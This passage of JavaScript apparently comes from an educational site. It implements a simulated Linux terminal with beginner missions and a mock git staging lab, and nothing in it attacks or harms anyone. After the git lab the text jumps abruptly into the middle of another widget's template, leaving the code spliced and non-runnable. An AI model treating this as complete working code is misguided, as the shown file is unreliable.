    const total = MISSIONS.length, doneN = MISSIONS.filter((m) => m.check()).length;
    $("#tmCount", el).textContent = `${doneN} / ${total}`;
    $("#tmBar", el).style.width = (doneN / total * 100) + "%";
    $("#tmTasks", el).innerHTML = MISSIONS.map((m) => {
      const ok = m.check();
      return `<li class="${ok ? "ok" : ""}">${ok ? "✓ " : ""}${esc(t("tm_m_" + m.id))}</li>`;
    }).join("");
    if (doneN === total && !done.has("_win")) { done.add("_win"); print(t("tm_all_done"), "win"); }
  }

  // ---- Buyruqlar ----
  const CMDS = {
    help: () => print(t("tm_help")),
    pwd: () => { print(cwd); done.add("_pwd"); },
    whoami: () => print("rejo"),
    id: () => print("uid=1000(rejo) gid=1000(rejo) groups=1000(rejo),27(sudo)"),
    hostname: () => print("kiber"),
    date: () => print(new Date().toString()),
    clear: () => { term.textContent = ""; },
    echo: (a, raw) => {
      // echo "matn" > fayl  yoki  echo matn >> fayl
      const m = raw.match(/^echo\s+(.*?)(?:\s*(>>?)\s*(\S+))?$/);
      let txt = (m ? m[1] : a.join(" ")).replace(/^["']|["']$/g, "");
      if (m && m[2]) {
        const { dir, name } = parentOf(m[3]);
        if (!dir || dir.t !== "d") return print(`${m[3]}: ${t("tm_nofile")}`, "err");
        if (m[2] === ">>" && dir.c[name] && dir.c[name].t === "f") dir.c[name].data += "\n" + txt;
        else dir.c[name] = { t: "f", data: txt };
        return;
      }
      print(txt);
    },
    ls: (a) => {
      const flags = a.filter((x) => x.startsWith("-")).join(""), target = a.find((x) => !x.startsWith("-")) || ".";
      const n = getNode(target);
      if (!n) return print(`ls: ${target}: ${t("tm_nofile")}`, "err");
      if (n.t === "f") return print(nameOf(resolve(target)));
      let items = Object.keys(n.c);
      if (!flags.includes("a")) items = items.filter((x) => !x.startsWith("."));
      else { items = [".", "..", ...items]; if (resolve(target) === HOME) done.add("_hidden"); }
      if (flags.includes("l")) items.forEach((x) => {
        const c = x === "." || x === ".." ? { t: "d" } : n.c[x];
        const perm = (c && c.perm) || (c && c.t === "d" ? "drwxr-xr-x" : "-rw-r--r--");
        const sz = c && c.t === "f" ? (c.data || "").length : 4096;
        print(`${perm} 1 rejo rejo ${String(sz).padStart(5)} Sep 28 10:00 ${x}`);
      });
      else print(items.join("  ") || "");
    },
    cd: (a) => {
      const p = resolve(a[0] || "~"), n = getNode(p);
      if (!n) return print(`cd: ${a[0]}: ${t("tm_nofile")}`, "err");
      if (n.t !== "d") return print(`cd: ${a[0]}: ${t("tm_notdir")}`, "err");
      cwd = p; setPrompt();
    },
    cat: (a) => {
      if (!a.length) return print(t("tm_usage_cat"), "err");
      for (const f of a) {
        const n = getNode(f);
        if (!n) print(`cat: ${f}: ${t("tm_nofile")}`, "err");
        else if (n.t === "d") print(`cat: ${f}: ${t("tm_isdir")}`, "err");
        else { if (n.perm === "-rw-------" && resolve(f) !== HOME + "/.flag") { /* ok */ } print(n.data); if (resolve(f) === HOME + "/.flag") done.add("_flag"); }
      }
    },
    head: (a) => catN(a, true), tail: (a) => catN(a, false),
    grep: (a) => {
      const pat = a.find((x) => !x.startsWith("-"));
      const file = a.filter((x) => !x.startsWith("-")).slice(1)[0];
      if (!pat || !file) return print(t("tm_usage_grep"), "err");
      const n = getNode(file);
      if (!n || n.t !== "f") return print(`grep: ${file}: ${t("tm_nofile")}`, "err");
      const ci = a.some((x) => x.startsWith("-") && x.includes("i"));
      n.data.split("\n").filter((ln) => ci ? ln.toLowerCase().includes(pat.toLowerCase()) : ln.includes(pat)).forEach((ln) => print(ln));
      if (file.includes("session") && pat.toLowerCase().includes("rejo")) done.add("_grep");
    },
    wc: (a) => {
      const file = a.find((x) => !x.startsWith("-")), n = getNode(file);
      if (!n || n.t !== "f") return print(`wc: ${file}: ${t("tm_nofile")}`, "err");
      const lines = n.data.split("\n");
      print(a.includes("-l") ? `${lines.length} ${file}` : `${lines.length} ${n.data.split(/\s+/).filter(Boolean).length} ${n.data.length} ${file}`);
      if (a.includes("-l") && file.includes("session")) done.add("_wc");
    },
    mkdir: (a) => {
      if (!a[0]) return print(t("tm_usage_mkdir"), "err");
      const { dir, name } = parentOf(a[0]);
      if (!dir || dir.t !== "d") return print(`mkdir: ${a[0]}: ${t("tm_nofile")}`, "err");
      if (dir.c[name]) return print(`mkdir: ${a[0]}: ${t("tm_exists")}`, "err");
      dir.c[name] = { t: "d", c: {} };
    },
    touch: (a) => {
      if (!a[0]) return print(t("tm_usage_touch"), "err");
      const { dir, name } = parentOf(a[0]);
      if (!dir || dir.t !== "d") return print(`touch: ${a[0]}: ${t("tm_nofile")}`, "err");
      if (!dir.c[name]) dir.c[name] = { t: "f", data: "" };
    },
    rm: (a) => {
      const rec = a.some((x) => x.startsWith("-") && x.includes("r"));
      const target = a.find((x) => !x.startsWith("-"));
      if (!target) return print(t("tm_usage_rm"), "err");
      const { dir, name, abs } = parentOf(target);
      if (!dir || !dir.c[name]) return print(`rm: ${target}: ${t("tm_nofile")}`, "err");
      if (dir.c[name].t === "d" && !rec) return print(`rm: ${target}: ${t("tm_isdir")} (rm -r)`, "err");
      if (abs === HOME || abs === "/") return print(`rm: ${t("tm_denied")}`, "err");
      delete dir.c[name];
    },
    cp: (a) => moveOrCopy(a, false), mv: (a) => moveOrCopy(a, true),
    find: (a) => {
      const named = a.includes("-name") ? a[a.indexOf("-name") + 1].replace(/["'*]/g, "") : "";
      const base = resolve(a[0] && !a[0].startsWith("-") ? a[0] : ".");
      const out = [];
      (function walk(path) { const n = getNode(path); if (!n || n.t !== "d") return; for (const k of Object.keys(n.c)) { const p = (path === "/" ? "" : path) + "/" + k; if (!named || k.includes(named)) out.push(p); walk(p); } })(base);
      if (!named || nameOf(base).includes(named)) out.unshift(base);
      out.forEach((p) => print(p));
      if (named) done.add("_find");
    },
    tree: () => {
      (function walk(path, pre) { const n = getNode(path); if (!n || n.t !== "d") return; const ks = Object.keys(n.c).filter((k) => !k.startsWith(".")); ks.forEach((k, i) => { const last = i === ks.length - 1; print(pre + (last ? "└── " : "├── ") + k); if (n.c[k].t === "d") walk((path === "/" ? "" : path) + "/" + k, pre + (last ? "    " : "│   ")); }); })(cwd, "");
    },
    chmod: (a) => {
      if (!a[0] || !a[1]) return print(t("tm_usage_chmod"), "err");
      const n = getNode(a[1]);
      if (!n) return print(`chmod: ${a[1]}: ${t("tm_nofile")}`, "err");
      const map = { "7": "rwx", "6": "rw-", "5": "r-x", "4": "r--", "0": "---" };
      if (/^[0-7]{3}$/.test(a[0])) { n.perm = "-" + a[0].split("").map((d) => map[d] || "---").join(""); done.add("_chmod"); }
      else print(`chmod: ${a[0]}: ${t("tm_bad_mode")}`, "err");
    },
    man: (a) => print(t("tm_man")),
    history: () => history.forEach((h, i) => print(`${String(i + 1).padStart(4)}  ${h}`)),
    sudo: (a) => { if (!a.length) return print(t("tm_usage_sudo"), "err"); print(t("tm_sudo_note")); run(a.join(" ")); },
  };
  function catN(a, head) {
    const file = a.find((x) => !x.startsWith("-")), n = getNode(file);
    if (!n || n.t !== "f") return print(`${file}: ${t("tm_nofile")}`, "err");
    const lines = n.data.split("\n");
    (head ? lines.slice(0, 5) : lines.slice(-5)).forEach((l) => print(l));
  }
  function moveOrCopy(a, isMove) {
    const src = a[0], dst = a[1];
    if (!src || !dst) return print((isMove ? "mv" : "cp") + `: ${t("tm_usage_cpmv")}`, "err");
    const s = getNode(src);
    if (!s) return print(`${src}: ${t("tm_nofile")}`, "err");
    let { dir, name } = parentOf(dst);
    const dstNode = getNode(dst);
    if (dstNode && dstNode.t === "d") { dir = dstNode; name = nameOf(resolve(src)); }
    if (!dir || dir.t !== "d") return print(`${dst}: ${t("tm_nofile")}`, "err");
    dir.c[name] = JSON.parse(JSON.stringify(s));
    if (isMove) { const ps = parentOf(src); delete ps.dir.c[ps.name]; }
  }

  function run(line) {
    print(`${$("#prompt", el).textContent} ${line}`, "cmdline");
    const raw = line.trim();
    const parts = raw.split(/\s+/), cmd = parts[0], args = parts.slice(1);
    if (!cmd) return;
    if (CMDS[cmd]) CMDS[cmd](args, raw);
    else print(`${cmd}: ${t("tm_notfound")}`, "err");
    renderTasks();
  }

  let hi = 0;
  $("#termForm", el).addEventListener("submit", (e) => {
    e.preventDefault();
    const line = input.value; input.value = "";
    if (line.trim()) { history.push(line); hi = history.length; }
    run(line);
  });
  input.addEventListener("keydown", (e) => {
    if (e.key === "ArrowUp") { e.preventDefault(); if (hi > 0) input.value = history[--hi]; }
    else if (e.key === "ArrowDown") { e.preventDefault(); hi = Math.min(hi + 1, history.length); input.value = history[hi] || ""; }
    else if (e.key === "Tab") { // oddiy tab-to'ldirish: joriy papkadagi nomlar
      e.preventDefault();
      const w = input.value.split(/\s+/).pop();
      const n = getNode(cwd);
      const match = Object.keys(n.c).filter((k) => k.startsWith(w));
      if (match.length === 1) input.value = input.value.slice(0, input.value.length - w.length) + match[0];
    }
  });
  el.querySelector(".term-wrap").addEventListener("click", () => input.focus());
  setPrompt(); renderTasks();
  print(t("tm_welcome"));
};

LABS.git = (el) => {
  let staged = [], committed = [], commits = [], modified = ["scan.py", "README.md"];
  const log = [];
  el.innerHTML = `
    <div class="git-grid">
      <div class="git-col"><h5>${esc(t("g_working"))}</h5><ul id="gWork"></ul></div>
      <div class="git-col"><h5>${esc(t("g_staging"))}</h5><ul id="gStage"></ul></div>
      <div class="git-col"><h5>${esc(t("g_repo"))}</h5><ul id="gRepo"></ul></div>
    </div>
    <div class="term-in git-cmd"><span class="prompt">$ git</span>
      <input id="gInput" autocomplete="off" spellcheck="false" placeholder="status" aria-label="git command"></div>
    <div class="git-out" id="gOut"></div>
    <p class="prose labnote">${esc(t("g_note"))}</p>`;
  const draw = () => {
    $("#gWork", el).innerHTML = modified.map((f) => `<li class="mod">● ${esc(f)}</li>`).join("") || `<li class="empty">${esc(t("g_clean"))}</li>`;
    $("#gStage", el).innerHTML = staged.map((f) => `<li class="stg">＋ ${esc(f)}</li>`).join("") || `<li class="empty">—</li>`;
    $("#gRepo", el).innerHTML = commits.map((c) => `<li class="cmt">◆ ${esc(c.msg)} <small>${esc(c.files.join(", "))}</small></li>`).join("") || `<li class="empty">—</li>`;
  };
  const out = (text, cls = "") => { $("#gOut", el).innerHTML = `<div class="${cls}">${text}</div>`; };
  const run = (raw) => {
    const parts = raw.trim().split(/\s+/), cmd = parts[0], rest = parts.slice(1);
    if (cmd === "status") {
      out(`${t("g_branch")}<br>${staged.length ? t("g_to_commit") + ": " + staged.map(esc).join(", ") + "<br>" : ""}${modified.length ? `<span class="mod">${t("g_not_staged")}: ${modified.map(esc).join(", ")}</span>` : t("g_clean")}`);
    } else if (cmd === "add") {
      const arg = rest[0];
      const take = arg === "." || arg === "-A" ? [...modified] : modified.filter((f) => f === arg);
      if (!take.length) return out(`${t("g_nomatch")}: ${esc(arg || "")}`, "err");
      staged.push(...take); modified = modified.filter((f) => !take.includes(f));
      out(t("g_added", { files: take.join(", ") }), "ok");
    } else if (cmd === "commit") {
      const mi = rest.indexOf("-m");
      const msg = mi >= 0 ? rest.slice(mi + 1).join(" ").replace(/^["']|["']$/g, "") : "";
      if (!staged.length) return out(t("g_nothing"), "err");
      if (!msg) return out(t("g_needmsg"), "err");
      commits.unshift({ msg, files: [...staged] }); staged = [];
      out(t("g_committed", { msg }), "ok");
    } else if (cmd === "push") {
      if (!commits.length) return out(t("g_nopush"), "err");
      out(t("g_pushed"), "ok");
    } else if (cmd === "log") {
      out(commits.length ? commits.map((c) => `<b>commit</b> ${Math.random().toString(16).slice(2, 9)}<br>&nbsp;&nbsp;&nbsp;&nbsp;${esc(c.msg)}`).join("<br><br>") : t("g_nolog"));
    } else if (cmd === "help" || !cmd) {
      out(t("g_help"));
    } else out(`git: '${esc(cmd)}' ${t("g_unknown")}`, "err");
    draw();
  };
  $("#gInput", el).addEventListener("keydown", (e) => { if (e.key === "Enter") { run($("#gInput", el).value); $("#gInput", el).value = ""; } });
  draw(); out(t("g_help"));
};

        <button type="button" class="btn" id="trRestart">${esc(t("ct_restart"))}</button></div>`;
      $("#trRestart", el).addEventListener("click", () => { pos = 0; solved = 0; render(); });
      return;
    }
    const it = items[order[pos]];
    revealed = false;
    card.innerHTML = `
      <div class="tr-q"><span class="tr-num">${pos + 1}</span><p>${esc(it.q)}</p></div>
      <div class="tr-inrow"><span class="tr-prompt">$</span><input id="trIn" class="tr-in" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="${esc(t("ct_ph"))}" aria-label="${esc(t("ct_ph"))}"></div>
